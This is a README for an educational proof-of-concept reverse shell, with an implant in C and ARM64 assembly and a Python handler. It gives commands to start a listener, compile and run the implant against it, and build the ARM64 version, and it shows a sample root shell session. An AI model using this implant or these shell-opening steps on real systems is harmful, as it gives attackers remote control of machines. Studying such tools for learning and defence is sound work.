# Reverse-Shell
A proof-of-concept reverse shell (written in C and ARM64/AARCH64 Assembly) and its handler (written in Python) for learning and educational purpose. The reverse shell is intended for x86 & x64 Linux based systems. However, by [using a cross-compiler](https://jensd.be/1126/linux/cross-compiling-for-arm-or-aarch64-on-debian-or-ubuntu), it can also be repurposed for ARM64/aarch64 Linux systems as well. Also, an ARM64 assembly code template has also been provided.

# Usage
This PoC is made of two components, a handler and the implant/reverse shell code. The implant/reverse shell code is written in C and ARM64/AARCH64 assembly code. This was done to -
- Learn more about reverse shell development, in C and ARM64 Assembly
- Have a reverse shell code that can be turned into shellcode

First, we execute the handler to listen on a particular address and port. The implant is also compatible with netcat
```bash
python3 python-handler.py 127.0.0.1 4444
```
The implant is also compatible with netcat, so it can also be used to manage a reverse shell connection.
```bash
nc -nvlp 127.0.0.1 4444 -s 127.0.0.1
```

Then, we compile the implant/reverse shell C code, and execute it by providing it with handler's listening address and port using the following steps -
```bash
# Compiling As C Code
gcc -o implant implant.c
./implant 127.0.0.1 4444
```

In order to use the ARM64 assembly code, use the following steps -
```bash
# Compiling As ARM64 Assembly Code
git clone https://github.com/pdoffl/Reverse-Shell.git
cd Reverse-Shell/ARM64-Assembly-Code
python3 python-implant_arm64-asmGenerator.py 127.0.0.1 4444
as -o implant_arm64.o implant_arm64.s
ld -o implant_arm64 implant_arm64.o
./implant_arm64
```
The steps above use a python script to embed Handler's IPv4 address and Port in the ARM64 Assembly template, and the final assembly code can be then assembled to create a binary that will connect to the handler and provide a shell when executed.

You'll see the connection on handler's end
```bash
[+] Handler Started On 127.0.0.1:4444
[+] Listening For Connections ...
[+] Connection Received From 127.0.0.1:58902
id
uid=0(root) gid=0(root) groups=0(root)
```

# Features
- Uses multithreaded handler to simultaneously handle receiving output from reverse shell, while sending commands from user
- Implant/reverse shell uses dup2() call to duplicate STDIN, STDOUT, STDERR across the network socket used to communicate with handler

# To Do
- [ ] Refined error handling on handler and implant's end
- [ ] Implement encryption for communication between handler and implant/reverse shell

# References
- https://pymotw.com/2/socket/tcp.html
- https://www.w3schools.com/python/python_try_except.asp
- https://docs.python.org/3/library/socket.html
- https://cocomelonc.github.io/tutorial/2021/09/11/reverse-shells.html
- https://www.idc-online.com/technical_references/pdfs/information_technology/Pairs_in_Python.pdf
- https://www.w3schools.com/python/python_user_input.asp
- https://www.geeksforgeeks.org/python-convert-string-to-bytes/
- https://g3tsyst3m.github.io/sockets/Create-your-own-Netcat-using-Python/
- https://anubissec.github.io/Creating-a-Reverse-Shell/
